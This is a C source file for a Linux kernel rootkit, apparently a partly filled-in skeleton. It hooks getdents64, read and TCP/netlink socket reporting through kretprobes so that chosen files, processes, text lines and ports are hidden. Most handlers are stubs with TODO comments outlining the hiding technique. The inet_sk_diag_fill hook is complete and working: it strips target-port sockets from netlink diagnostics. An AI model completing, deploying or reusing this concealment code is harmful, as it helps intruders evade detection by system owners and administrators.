// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"
#include <linux/dirent.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/ptrace.h>
#include <linux/seq_file.h>
#include <linux/skbuff.h>
#include <linux/slab.h>
#include <linux/types.h>
#include <linux/uaccess.h>
#include <net/inet_sock.h>

#ifndef SEQ_START_TOKEN
#define SEQ_START_TOKEN ((void *)1)
#endif

/* Getdents64 filter (files and PIDs) */

struct getdents_data {
	void __user *ubuf;
	int fd;
};

// TODO: getdents_entry (save ubuf from inner pt_regs, double indirection)
static int getdents_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	return 1;
}

// TODO: getdents_return (copy, walk d_reclen, memmove hidden, write back)
static int getdents_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	return 0;
}

struct kretprobe rk_getdents_probe = {
    .handler = getdents_return,
    .entry_handler = getdents_entry,
    .data_size = sizeof(struct getdents_data),
    .maxactive = 20,
    .kp.symbol_name = "__x64_sys_getdents64",
};

/* Read filter (content lines) */

struct read_data {
	void __user *ubuf;
	size_t count;
};

// TODO: read_entry (save buf+count from direct regs)
static int read_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	return 1;
}

// TODO: read_return (copy, walk lines, filter matches, write back)
static int read_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	return 0;
}

struct kretprobe rk_read_probe = {
    .handler = read_return,
    .entry_handler = read_entry,
    .data_size = sizeof(struct read_data),
    .maxactive = 20,
    .kp.symbol_name = "ksys_read",
};

/* TCP seq_show filter (ports) */

struct tcp_show_data {
	struct seq_file *seq;
	int saved_count;
	struct sock *sk;
};

// TODO: tcp_show_entry (save seq_file count + sock from direct regs)
static int tcp_show_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	return 1;
}

// TODO: tcp_show_return (extract port, match, rewind count)
static int tcp_show_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	return 0;
}

struct kretprobe rk_tcp4_probe = {
    .handler = tcp_show_return,
    .entry_handler = tcp_show_entry,
    .data_size = sizeof(struct tcp_show_data),
    .maxactive = 20,
    .kp.symbol_name = "tcp4_seq_show",
};

struct kretprobe rk_tcp6_probe = {
    .handler = tcp_show_return,
    .entry_handler = tcp_show_entry,
    .data_size = sizeof(struct tcp_show_data),
    .maxactive = 20,
    .kp.symbol_name = "tcp6_seq_show",
};

struct inet_diag_data {
	struct sk_buff *skb;
	unsigned int saved_len;
	bool hide;
};

static int inet_diag_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct inet_diag_data *data = (struct inet_diag_data *)ri->data;
	struct inet_sock *inet = inet_sk((struct sock *)regs->di);
	char port_str[8];

	data->skb = (struct sk_buff *)regs->dx;
	data->saved_len = data->skb->len;
	snprintf(port_str, sizeof(port_str), "%u", ntohs(inet->inet_sport));
	data->hide = rk_target_match(&rk_port_targets, port_str);
	return 0;
}

static int inet_diag_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct inet_diag_data *data = (struct inet_diag_data *)ri->data;

	if (data->hide && regs_return_value(regs) == 0 &&
	    data->skb->len > data->saved_len)
		skb_trim(data->skb, data->saved_len);
	return 0;
}

struct kretprobe rk_inet_diag_probe = {
	.handler = inet_diag_return,
	.entry_handler = inet_diag_entry,
	.data_size = sizeof(struct inet_diag_data),
	.maxactive = 64,
	.kp.symbol_name = "inet_sk_diag_fill",
};

// TODO: command table and rk_filter_init
int rk_filter_init(void)
{
	return 0;
}
